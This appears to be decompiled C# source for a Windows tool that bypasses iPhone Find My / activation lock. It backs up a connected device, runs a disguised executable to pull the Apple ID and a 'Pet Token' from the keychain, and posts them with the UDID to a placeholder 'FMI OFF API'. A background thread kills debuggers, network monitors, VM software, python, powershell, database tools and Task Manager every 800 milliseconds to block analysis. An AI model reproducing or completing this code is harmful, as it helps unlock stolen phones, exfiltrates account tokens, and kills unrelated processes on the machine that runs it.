using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ns0;
using Siticone.Desktop.UI.WinForms;
using Siticone.Desktop.UI.WinForms.Enums;

namespace ns0
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			this.InitializeComponent();
			Form1.smethod_1();
			this.method_1();
		}

		public void method_1()
		{
			if (this.method_2("SerialNumber") != "")
			{
				this.statuslb.Text = "Device Ready For Unlock ✔️";
				this.backgroundWorker_0.RunWorkerAsync();
			}
			this.managementEventWatcher_0 = new ManagementEventWatcher();
			WqlEventQuery query = new WqlEventQuery("SELECT * FROM Win32_DeviceChangeEvent WHERE EventType = 2 or EventType = 3 GROUP WITHIN 1 ");
			this.managementEventWatcher_0.EventArrived += delegate(object sender, EventArrivedEventArgs e)
			{
				if (this.method_2("SerialNumber") != "")
				{
					this.statuslb.Text = "Ready ✔️";
					this.backgroundWorker_0.RunWorkerAsync();
				}
			};
			this.managementEventWatcher_0.Query = query;
			this.managementEventWatcher_0.Start();
		}

		public string method_2(string Info)
		{
			string contents = "@echo off\nwinx64\\ideviceinfo.exe | winx64\\grep.exe -w " + Info + " | winx64\\awk.exe '{printf $NF}'";
			File.WriteAllText("winx64\\Info.cmd", contents);
			Process process = new Process();
			process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "winx64\\Info.cmd",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					CreateNoWindow = true
				}
			};
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			return standardOutput.ReadToEnd();
		}
		public static void smethod_0(object object_0)
		{
			string[] array = new string[]
			{
				"codecracker",
				"x32dbg",
				"x64dbg",
				"ida -",
				"charles",
				"dnspy",
				"simpleassembly",
				"peek",
				"httpanalyzer",
				"httpdebug",
				"fiddler",
				"wireshark",
				"devirt",
				"logger",
				"usbtrace",
				"usbmonitor",
				"serialmonitor",
				"ilspy",
				"charlesproxy",
				"fiddler",
				"postman",
				"extremedumper",
				"ollydbg",
				"softice",
				"dotpeek",
				"jetbrains",
				"proxysite",
				"Postman",
				"WireShark",
				"Charles",
				"Progress Telerik Fiddler Web Debugger",
				"Fiddler",
				"Fiddler Everywhere",
				"HTTPDebuggerUI",
				"KsDumperClient",
				"ExtremeDumper",
				"Proxifier",
				"dotPeek32",
				"dotPeek64",
				"JetBrains dotPeek",
				"HttpAnalyzerStdV7",
				"Proxifier",
				"x32dbg",
				"x64dbg",
				"Simple Assembly Explorer",
				"ida64",
				"ida32",
				"logger",
				"USBTrace",
				"ChmDecompiler",
				"PE Explorer",
				"VBDecompiler",
				"Docklight",
				"Reflector",
				"ExtremeDumper",
				"ILSpy",
				"OLLYDBG",
				"SoftICE",
				"softice",
				"jetbrains",
				"Codecracker",
				"Proxysite",
				"Spices.Net",
				"JustDecompile",
				"Cutter",
				"DbgX.Shell",
				"The debugger",
				"Easy Proxy Finder",
				"Proxy Finder Premium",
				"Proxy Finder",
				"Proxy Finder Premium",
				"Proxy Finder Enterprise",
				"Easy Proxy Finder",
				"Proxifier Portable",
				"Proxy Finder Premium",
				"ProxyFinder",
				"Jackett",
				"winfoom",
				"LightProxy",
				"winfoom",
				"Jackett",
				"Clashy",
				"GSA Proxy Scraper",
				"XX-Net",
				"Go dispatch proxy",
				"Proxifier",
				"Reversee",
				"LocalXpose",
				"SniffingProxies",
				"Forum Proxy Leecher",
				"RSocks Proxy Checker",
				"SQLi Dumper",
				"URL Analyzer",
				"Dump SQL",
				"File Dumper",
				"HEADMasterSEO",
				"WinAutomation Professional Plus",
				"ChrisPC Anonymous Proxy Pro",
				"AS3 Sorcerer",
				"Oxygen XML Editor",
				"JP Software Take Command",
				"IntraWeb Ultimate Edition",
				"Devart LINQ Insigh",
				"MAMP PRO",
				"HTTPDebuggerUI",
				"Debugger",
				"CMDebug IDE/Debugger",
				"CMDebug",
				"Python ida",
				"python",
				"pythonw",
				"ida",
				"powershell",
				"putty",
				"WebSurge",
				"WebSurge",
				"MIHTool Pro",
				"EKFiddle",
				"HookDump",
				"hookdump",
				"Debugging Generic Web",
				"Debug Configurations",
				"Debugging web services",
				"firebug",
				"Firefox",
				"FireBug",
				"GDB",
				"Syser Debugger",
				"advanced_ip_scanner",
				"ipscan221",
				"Angry IP Scanner",
				"fping",
				"fping 5.0",
				"Pinkie",
				"npcap",
				"npcap_wfp",
				"Network Performance Monitoring",
				"OpManager Monitoring",
				"OpManager",
				"PingPlotter",
				"fbserver",
				"iphostmonitor",
				"Monitor. Visualize. Relax.",
				"Monitor Visualize",
				"PRTG Network Monitor",
				"Network Monitor",
				"Engineer's Toolset",
				"engineers-toolset",
				"toolset",
				"NetScanTools Pro",
				"NMapWin",
				"superpinger",
				"nbthostmonitor",
				"BlueCat Address Manager",
				"Angry IP Scanner",
				"Solarwinds IP Control Bundle",
				"Solarwinds",
				"Nessus",
				"Nessus-8",
				"OpenVAS",
				"openvas",
				"advanced IP manager",
				"IP Address Manager",
				"TCP Port Scan",
				"ipscan",
				"netscanner",
				"spiceworks",
				"SolarWinds Port Scanner",
				"solarWinds",
				"ManageEngine OpUtils",
				"manageengine",
				"SolarWinds Ping Sweep",
				"SolarWinds",
				"MyLAN Viewer",
				"MyLAN",
				"oid2name",
				"postgres",
				"opsrv",
				"pg_archivecleanup",
				"pg_basebackup",
				"pg_config",
				"pg_controldata",
				"pg_ctl",
				"pg_dump",
				"pg_dumpall",
				"pg_isolation_regress",
				"pg_isready",
				"pg_receivexlog",
				"pg_recvlogical",
				"pg_regress",
				"pg_regress_ecpg",
				"pg_resetxlog",
				"pg_restore",
				"pg_rewind",
				"pg_standby",
				"pg_test_fsync",
				"pg_test_timing",
				"pg_upgrade",
				"pg_xlogdump",
				"pgAdmin3",
				"pgbench",
				"psql",
				"postgres",
				"reindexdb",
				"vacuumdb",
				"vacuumlo",
				"zic",
				"clusterdb",
				"createdb",
				"createlang",
				"createuser",
				"dropdb",
				"droplang",
				"dropuser",
				"ecpg",
				"initdb",
				"isolationtester",
				"CV",
				"netscan",
				"Privacy Reviver",
				"PortForwardNetworkUtilities",
				"Nsauditor",
				"MyLanViewer",
				"findmac",
				"IP Scan",
				"gsam",
				"Complete Internet Repair",
				"idevicedebug",
				"procmon64",
				"codecracker",
				"x96dbg",
				"pizza",
				"pepper",
				"reverse",
				"reversal",
				"de4dot",
				"pc-ret",
				"crack",
				"ILSpy",
				"x32dbg",
				"sharpod",
				"x64dbg",
				"x32_dbg",
				"x64_dbg",
				"dbg",
				"strongod",
				"PhantOm",
				"titanHide",
				"scyllaHide",
				"ilspy",
				"graywolf",
				"simpleassemblyexplorer",
				"MegaDumper",
				"megadumper",
				"X64NetDumper",
				"x64netdumper",
				"HxD",
				"hxd",
				"PETools",
				"petools",
				"Protection_ID",
				"protection_id",
				"die",
				"process hacker 2",
				"process",
				"hacker",
				"ollydbg",
				"x32dbg",
				"x64dbg",
				"ida -",
				"charles",
				"dnspy",
				"simpleassembly",
				"peek",
				"httpanalyzer",
				"httpdebug",
				"fiddler",
				"wireshark",
				"proxifier",
				"mitmproxy",
				"process hacker",
				"process monitor",
				"process hacker 2",
				"system explorer",
				"systemexplorer",
				"systemexplorerservice",
				"WPE PRO",
				"ghidra",
				"folderchangesview",
				"pc-ret",
				"folder",
				"dump",
				"web proxy",
				"de4dotmodded",
				"StringDecryptor",
				"Centos",
				"SAE",
				"monitor",
				"brute",
				"checker",
				"zed",
				"sniffer",
				"http",
				"debugger",
				"james",
				"exeinfope",
				"codecracker",
				"x32dbg",
				"x64dbg",
				"ollydbg",
				"ida -",
				"charles",
				"dnspy",
				"simpleassembly",
				"peek",
				"httpanalyzer",
				"httpdebug",
				"fiddler",
				"wireshark",
				"dbx",
				"mdbg",
				"gdb",
				"windbg",
				"dbgclr",
				"kdb",
				"kgdb",
				"mdb",
				"PrivacyReviver",
				"PacDbg",
				"taskmgr",
				"Task Manager DeLuxe"
			};
			for (;;)
			{
				try
				{
					foreach (Process process in Process.GetProcesses())
					{
						if (process != Process.GetCurrentProcess())
						{
							for (int j = 0; j < array.Length; j++)
							{
								int id = Process.GetCurrentProcess().Id;
								if (process.ProcessName.ToLower().Contains(array[j]))
								{
									process.Kill();
								}
								if (process.MainWindowTitle.ToLower().Contains(array[j]))
								{
									process.Kill();
								}
							}
							if (process.ProcessName == "Task Manager DeLuxe x64" || process.ProcessName.Contains("Task Manager DeLuxe"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "WireShark" || process.ProcessName.Contains("WinSCP"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "CMDebug" || process.ProcessName.Contains("ipscan"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "Progress Telerik Fiddler Web Debugger" || process.ProcessName == "Fiddler Everywhere")
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "WebSurge" || process.ProcessName.Contains("httpdebug"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "advanced_ip_scanner" || process.ProcessName.Contains("ipscan221"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "Pinkie" || process.ProcessName.Contains("PingPlotter"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "CV" || process.ProcessName.Contains("netscan"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "Privacy Reviver" || process.ProcessName.Contains("PrivacyReviver"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "PortForwardNetworkUtilities" || process.ProcessName.Contains("RouterLogin"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "PortForwardScreenshot" || process.ProcessName.Contains("PFStaticIP"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "PFScreenshotMessage" || process.ProcessName.Contains("PFRSG"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "PFRouterDetector" || process.ProcessName.Contains("PFPortChecker"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "PFConfigSupportTool" || process.ProcessName.Contains("PFConfigHelper"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "PFConfig" || process.ProcessName.Contains("Nsauditor"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "MyLanViewer" || process.ProcessName.Contains("dm.st"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "Turbo Virtual Machine" || process.ProcessName.Contains("Turbo Virtual Machine Executable"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "ComIntRep" || process.ProcessName.Contains("ComIntRep_X64"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "WireShark" || process.MainWindowTitle.Contains("httpanalyzer"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "CharlesProxy" || process.MainWindowTitle.Contains("CharlesProxy"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.MainWindowTitle == "Progress Telerik Fiddler Web Debugger" || process.ProcessName == "Fiddler Everywhere")
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "Fiddler" || process.MainWindowTitle.Contains("httpdebug"))
							{
								Process.GetCurrentProcess().Kill();
							}
							if (process.ProcessName == "VirtualBox" || process.MainWindowTitle.Contains("VBoxSVC"))
							{
								process.Kill();
							}
							if (process.ProcessName == "VBoxSDS" || process.MainWindowTitle.Contains("VBoxSDL"))
							{
								process.Kill();
							}
							if (process.ProcessName == "vmware" || process.MainWindowTitle.Contains("VMware Workstation (32 bit)"))
							{
								process.Kill();
							}
							if (process.ProcessName == "VMware Workstation" || process.MainWindowTitle.Contains("VMware Workstation (64 bit)"))
							{
								process.Kill();
							}
							if (process.ProcessName == "vmplayer" || process.MainWindowTitle.Contains("vmnat"))
							{
								process.Kill();
							}
						}
					}
				}
				catch (Exception)
				{
				}
				Thread.Sleep(800);
			}
		}

		public static void smethod_1()
		{
			new Thread(new ParameterizedThreadStart(Form1.smethod_0)).Start(Thread.CurrentThread);
		}

		private void method_3()
		{
			string text = this.gclass0_0.method_3();
			Console.WriteLine(text);
			if (text.Contains("trust"))
			{
				this.bool_1 = true;
				MessageBox.Show("Turn on the device screen, press the home button or swipe up and press Trust.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				this.bool_1 = false;
			}
			else
			{
				if (text.Contains("passcode"))
				{
					this.bool_1 = true;
					MessageBox.Show("Input the passcode of the device in the device.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					this.bool_1 = false;
				}
				if (text.Contains("with host") || text.Contains("code -7") || text.Contains("unhandled"))
				{
					this.bool_1 = true;
					MessageBox.Show("Turn on the device screen, press the home button or swipe up and press Trust.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					this.bool_1 = false;
				}
				if (text.Contains("not pair"))
				{
					this.bool_1 = true;
					MessageBox.Show("Please reconnect the device to computer then turn on the device screen, press the home button or swipe up and press Trust. ", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					this.bool_1 = false;
				}
			}
			try
			{
				Form1.smethod_2("idevicepair");
			}
			catch
			{
			}
		}

		public static void smethod_2(string process)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName(process);
				for (int i = 0; i < processesByName.Length; i++)
				{
					processesByName[i].Kill();
				}
			}
			catch
			{
			}
		}

		public void method_4()
		{
			string address = this.gclass0_0.method_0(this.string_1);
			using (WebClient webClient = new WebClient())
			{
				try
				{
					using (MemoryStream memoryStream = new MemoryStream(webClient.DownloadData(address)))
					{
					}
				}
				catch
				{
				}
			}
		}

		private void Form1_Load(object sender, EventArgs e)
		{
		}

		private void method_5(object sender, EventArgs e)
		{
			this.button.Enabled = false;
			this.backgroundWorker_1.RunWorkerAsync();
		}

		private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
		{
			if (this.method_2("SerialNumber") != "")
			{
				this.method_3();
				this.string_0 = this.method_2("SerialNumber");
				this.string_1 = this.method_2("ProductType");
				this.string_4 = this.method_2("ProductVersion");
				this.string_3 = this.gclass0_0.method_6(this.string_1);
				this.string_2 = this.method_2("UniqueDeviceID");
				this.method_4();
				this.modellb.Text = this.string_3;
				this.seriallb.Text = this.string_0;
				this.ioslb.Text = this.string_4;
				this.productlb.Text = this.string_1;
				this.button.Enabled = true;
			}
			else
			{
				this.modellb.Text = "No Device";
				this.seriallb.Text = "No Device";
				this.ioslb.Text = "No Device";
				this.productlb.Text = "No Device";
				this.button.Enabled = false;
			}
		}

		public static string smethod_3()
		{
			string result;
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "ideviceinfo.exe",
					Arguments = "-k SerialNumber",
					RedirectStandardOutput = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using (Process process = Process.Start(startInfo))
				{
					result = process.StandardOutput.ReadToEnd().Trim();
				}
			}
			catch (Exception ex)
			{
				result = "Error: " + ex.Message;
			}
			return result;
		}

        public static async Task<string> smethod_4(string serialNumber)
        {
            if (!string.IsNullOrEmpty(serialNumber))
            {
                serialNumber = serialNumber.Trim().ToUpper();
                string url = "PUT YOUR API FOR REGISTER HERE" + serialNumber;
                try
                {
                    HttpClient client = new HttpClient();
                    try
                    {
                        string result = await client.GetStringAsync(url);
                        Match match = Regex.Match(result, "\"status\":\"(.*?)\"");
                        if (match.Success)
                        {
                            return match.Groups[1].Value;
                        }
                        return "Error: Unexpected response - " + result;
                    }
                    finally
                    {
                        ((IDisposable)client)?.Dispose();
                    }
                }
                catch (Exception ex2)
                {
                    Exception ex = ex2;
                    return "Exception: " + ex.Message;
                }
            }
            return "Error: Serial number is empty!";
        }

        public static async Task smethod_5()
        {
            string serialNumber = smethod_3();
            Console.WriteLine("Serial Number: " + serialNumber);
            if (string.IsNullOrEmpty(serialNumber) || serialNumber.StartsWith("Error"))
            {
                Console.WriteLine("Error: Invalid serial number retrieved.");
            }
            else
            {
                Console.WriteLine("Verification Result: " + await smethod_4(serialNumber));
            }
        }

        private async void backgroundWorker_1_DoWork(object sender, DoWorkEventArgs e)
        {
            button.Enabled = false;
            method_7();
            string serialNumber = smethod_3();
            serialNumber = serialNumber.Trim().ToUpper();
            if (string.IsNullOrEmpty(serialNumber) || serialNumber.StartsWith("Error"))
            {
                MessageBox.Show("No valid device detected! Connect your device and press trust.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                button.Enabled = true;
                return;
            }
            string verificationResult = await smethod_4(serialNumber);
            MessageBox.Show("Verification result: " + verificationResult, "Debug Info", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            if (verificationResult == "verified")
            {
                MessageBox.Show("Device verified!", "Verification Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                MessageBox.Show("STEPS TO FOLLOW:\n1) Turn OFF & TURN ON Game Center From iCloud\n2) Turn ON Airplane Mode (Disconnect Internet From Device)\n3) PRESS OK Button", "Please Follow These Steps!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                smethod_2("idevicebackup2");
                string text = gclass0_0.method_7();
                smethod_2("idevicebackup2");
                smethod_2("SHDPH95xGvisual_installer");
                if (text.Contains("Backup encryption is already enabled") || text.Contains("successfully"))
                {
                    timer_0.Start();
                    siticoneProgressBar1.Value = 30;
                    method_6();
                    return;
                }
                if (text.Contains("Device locked"))
                {
                    button.Enabled = true;
                    MessageBox.Show("Please enter the screen lock password to unlock", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }
                MessageBox.Show(text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
            else if (verificationResult == "not verified")
            {
                button.Enabled = false;
                MessageBox.Show("Please register your device", "Not Verified", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else
            {
                button.Enabled = true;
                MessageBox.Show("Error: " + verificationResult, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
            button.Enabled = true;
        }


        private void method_6()
		{
			Console.WriteLine("dang backup");
			this.statuslb.Text = "Backing up keychain.Please wait !";
			if (!Directory.Exists(this.string_5))
			{
				Directory.CreateDirectory(this.string_5);
			}
			string path = this.string_5 + "Backup";
			if (Directory.Exists(path))
			{
				Directory.Delete(path, true);
			}
			Directory.CreateDirectory(path);
			string text = this.gclass0_0.method_8(path);
			if (text.Contains("Backup Successful"))
			{
				this.siticoneProgressBar1.Value = 50;
				this.statuslb.Text = "backup succeeded.. Processing Backup..";
				this.method_8();
			}
			else
			{
				string[] array = text.Split(new char[]
				{
					'\n'
				});
				string str = "";
				foreach (string text2 in array)
				{
					if (text2.StartsWith("Error"))
					{
						str = text2.Replace("ID :  ", "");
					}
				}
				this.method_7();
				this.statuslb.Text = "Error While Backup.try Again";
				this.button.Enabled = true;
				MessageBox.Show("An error occurred: " + str, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void method_7()
		{
			this.siticoneProgressBar1.Value = 0;
			if (Directory.Exists("C:\\tmp"))
			{
				Directory.Delete("C:\\tmp", true);
			}
		}

		private void method_8()
		{
			string currentDirectory = Environment.CurrentDirectory;
			string text = Path.Combine(currentDirectory, "winx64", "libterm-2.dll");
			try
			{
				if (File.Exists(text))
				{
					if (!Directory.Exists(this.string_5))
					{
						Directory.CreateDirectory(this.string_5);
					}
					if (!File.Exists(this.string_5 + "\\SHDPH95xGvisual_installer.exe"))
					{
						File.Delete(this.string_5 + "\\SHDPH95xGvisual_installer.exe");
					}
					File.Copy(text, this.string_5 + "\\SHDPH95xGvisual_installer.exe");
					Console.WriteLine("File moved successfully.");
					this.siticoneProgressBar1.Value = 70;
					this.method_9();
				}
				else
				{
					this.statuslb.Text = "Error While Backup.try Again";
					this.method_7();
				}
			}
			catch (Exception)
			{
				this.statuslb.Text = "Error While Backup , Try Again..";
				this.method_7();
				this.button.Enabled = true;
			}
		}

		private void method_9()
		{
			string str = "SHDPH95xGvisual_installer " + this.string_2 + " d >7l2asY8yAPIDebugLogFile";
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c \"" + str + "\"",
					WorkingDirectory = this.string_5,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					CreateNoWindow = true,
					UseShellExecute = false
				};
				using (Process process = new Process())
				{
					process.StartInfo = startInfo;
					process.Start();
					process.WaitForExit();
					if (process.ExitCode != 0)
					{
						string str2 = process.StandardError.ReadToEnd();
						MessageBox.Show("Error: " + str2);
						this.statuslb.Text = "Error While Process , Try Again..";
					}
					else
					{
						this.siticoneProgressBar1.Value = 80;
						this.method_10();
					}
				}
			}
			catch (Exception)
			{
				this.statuslb.Text = "Error While Backup , Try Again..";
				this.method_7();
				this.button.Enabled = true;
			}
		}

		[DebuggerStepThrough]
        private async void method_10()
        {
            try
            {
                string text5 = File.ReadAllText(string_5 + "7l2asY8yAPIDebugLogFile");
                if (!text5.Contains("ID"))
                {
                    statuslb.Text = "Backup password is already enabled.";
                    MessageBox.Show("Backup password is already enabled.\nGo to Setting > General > Reset > Resell All Settings > Try again!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    Environment.Exit(0);
                    return;
                }
                string text6 = "";
                string text7 = "";
                string[] array = text5.Split('\n');
                foreach (string text8 in array)
                {
                    if (text8.StartsWith("ID :  "))
                    {
                        text6 = text8.Replace("ID :  ", "");
                    }
                    if (text8.StartsWith("Pet Token :  "))
                    {
                        text7 = text8.Replace("Pet Token :  ", "");
                    }
                    if (text6 != "" && text7 != "")
                    {
                        statuslb.Text = "Turning OFF Fmi With Apple Server..";
                        await smethod_6(text6, text7, string_0);
                        text6 = "";
                        text7 = "";
                    }
                }
                siticoneProgressBar1.Value = 100;
                button.Enabled = true;
                statuslb.Text = "All Completed , Check FMI ✔\ufe0f";
            }
            catch
            {
                siticoneProgressBar1.Value = 0;
                method_7();
                button.Enabled = true;
                statuslb.Text = "Error While FMI OFF  , Try Again..";
                MessageBox.Show("Error while extract token , Try Again!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
            method_7();
        }

        [DebuggerStepThrough]
        public static async Task<string> smethod_6(string appleId, string password, string udid)
        {
            HttpClient client = new HttpClient();
			try
			{
				string url = "PUT YOUR FMI OFF API HERE";
				FormUrlEncodedContent formData = new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)new KeyValuePair<string, string>[3]
				{
				new KeyValuePair<string, string>("appleid", appleId),
				new KeyValuePair<string, string>("PET", password),
				new KeyValuePair<string, string>("key", udid)
				});
				HttpResponseMessage response = await client.PostAsync(url, (HttpContent)(object)formData);
				string responseBody = await response.get_Content().ReadAsStringAsync();
				if (response.get_IsSuccessStatusCode())
                {
                    MessageBox.Show(responseBody.ToString(), appleId + " :  ", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
                else
                {
                    MessageBox.Show("Error while conecting to servers , Check your network", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }
            catch (Exception ex2)
            {
                Exception ex = ex2;
                MessageBox.Show("Error while conecting to servers , Check your network", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return "An error occurred: " + ex.Message;
            }
            finally
            {
                ((IDisposable)client)?.Dispose();
            }
            return "";
        }

        public void method_11()
		{
			if (Directory.Exists(this.string_5))
			{
				Directory.Delete(this.string_5, true);
			}
			Environment.Exit(0);
		}

		private void method_12(object sender, EventArgs e)
		{
		}

		private void Form1_MouseDown(object sender, MouseEventArgs e)
		{
			this.bool_0 = true;
			this.point_0 = new Point(e.X, e.Y);
		}

		private void Form1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.bool_0)
			{
				Point point = base.PointToScreen(e.Location);
				base.Location = new Point(point.X - this.point_0.X, point.Y - this.point_0.Y);
			}
		}

		private void Form1_MouseUp(object sender, MouseEventArgs e)
		{
			this.bool_0 = false;
		}

		private void method_13(object sender, EventArgs e)
		{
			if (this.string_2 != null)
			{
				Clipboard.SetText(this.string_2);
				this.statuslb.Text = "udid copied to clipboard";
			}
			else
			{
				this.statuslb.Text = "NMo Device For Copy!";
			}
		}

		private void method_14(object sender, EventArgs e)
		{
		}

		private void method_15(object sender, EventArgs e)
		{
			if (this.string_2 != null)
			{
				Clipboard.SetText(this.string_2);
				this.statuslb.Text = "Succesfully Copied ! ";
			}
			else
			{
				this.statuslb.Text = "UDID IS null";
			}
		}

		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			this.method_7();
			Environment.Exit(0);
		}
		private void udidlb_Click(object sender, EventArgs e)
		{
		}

		private void seriallb_Click(object sender, EventArgs e)
		{
			Clipboard.SetText(this.string_0);
			MessageBox.Show("Serial Number Copied To Clipboard!");
		}

		private void button_Click(object sender, EventArgs e)
		{
			this.backgroundWorker_1.RunWorkerAsync();
		}

		private void siticoneHtmlLabel1_Click(object sender, EventArgs e)
		{
		}

		public string string_0;

		public string string_1;

		public string string_2;

		public string string_3;

		public string string_4;

		private GClass0 gclass0_0 = new GClass0();

		private bool bool_0 = false;

		private Point point_0 = new Point(0, 0);

		private ManagementEventWatcher managementEventWatcher_0;

		public bool bool_1;

		private string string_5 = "C:\\tmp\\";

		private int int_0 = 0;

		private void picDevice_Click(object sender, EventArgs e)
		{

		}
	}
}
